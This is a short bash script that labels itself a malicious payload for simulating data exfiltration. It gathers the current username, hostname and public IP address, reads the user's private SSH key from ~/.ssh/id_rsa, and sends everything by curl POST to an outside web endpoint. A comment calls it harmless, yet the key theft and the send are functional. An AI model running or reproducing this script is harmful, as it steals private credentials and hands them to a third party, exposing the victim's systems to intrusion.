#!/bin/bash
# malicious payload script to simulate data exfiltration to a cloudflare endpoint

# collect sensitive information
username=$(whoami)
hostname=$(hostname)
ip_address=$(curl -s https://api.ipify.org)
ssh_keys=$(cat ~/.ssh/id_rsa 2>/dev/null)
firefox_cookies="testcookies"


# package the data
payload="USER=$username HOST=$hostname IP=$ip_address SSH_KEYS=$ssh_keys COOKIES=$firefox_cookies"

# exfiltrate the data to the cloudflare pages endpoint
curl -X POST -H "Content-Type: application/json" \
     -d "{\"data\":\"$payload\"}" \
     https://masonmelead.com/log

# clean up traces (for simulation, this does nothing harmful)
echo "Test payload sent to Cloudflare Pages"